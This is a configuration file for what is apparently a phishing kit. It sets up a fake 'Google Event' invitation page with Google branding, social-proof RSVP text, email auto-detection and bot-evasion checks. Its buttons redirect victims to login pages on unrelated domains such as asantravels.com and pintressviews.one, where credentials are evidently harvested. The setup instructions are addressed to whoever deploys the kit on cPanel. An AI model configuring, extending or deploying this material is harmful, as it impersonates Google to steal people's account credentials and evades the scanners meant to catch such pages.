/**
 * ═══════════════════════════════════════════════════════════════════
 *  GOOGLE EVENT LANDING — EDIT THIS FILE BEFORE UPLOADING TO CPANEL
 * ═══════════════════════════════════════════════════════════════════
 *
 *  Change nextPageUrl below to YOUR link.
 *  Both "Open Invitation" and "Tap to Continue" go to that exact URL.
 *
 *  Examples:
 *    nextPageUrl: 'https://pintressviews.one/dar/login/',
 *    nextPageUrl: 'https://pintressviews.one/dar/login/?email={{email}}',
 *    nextPageUrl: '../login/index.html',
 */
window.AURA_SETTINGS = {
  /** ← PUT YOUR LINK HERE (only edit this line for redirects) */
  nextPageUrl: 'https://asantravels.com/zip/accounts/',

  /** Headline occasion text (replaces [special occasion]). */
  occasionTitle: 'special occasion',

  /** Social proof invitation line. */
  inviterNames: 'you and other 27 people are invited',

  /** RSVP badge text. */
  rsvpCount: '500+ guests RSVP\'d using Google',

  /**
   * Optional forced email override. Leave empty to auto-detect only.
   * When empty and nothing is detected, the card shows only "Tap to Continue".
   */
  defaultEmail: '',

  /** Optional "My Invites" nav link (leave empty for #). */
  myInvitesUrl: '',

  /** Privacy policy link in the sign-in disclaimer. */
  privacyPolicyUrl: 'https://policies.google.com/privacy',

  /**
   * Folder path on your server. Leave empty — auto-detected from the page URL.
   * Only set if video still fails, e.g. basePath: '/dar/aura-events/'
   */
  basePath: '',

  /**
   * Demo video — filename inside the video/ folder, or a full HTTPS URL.
   */
  videoUrl: 'demo_Z4Ya.mp4',

  /** Optional video poster image. */
  videoPoster: '',

  /** Loop, mute, and autoplay (muted autoplay is required by browsers). */
  videoLoop: true,
  videoMuted: true,
  videoAutoplay: true,

  /** Minimal invisible bot protection (no gate screen). */
  antibotEnabled: true,
  antibotMinDelayMs: 800,
  antibotMinScore: 4,
  antibotMinMoves: 2,
  antibotCfMinDelayMs: 400,
  antibotCfMinScore: 2,
  antibotCfMinMoves: 1,
};
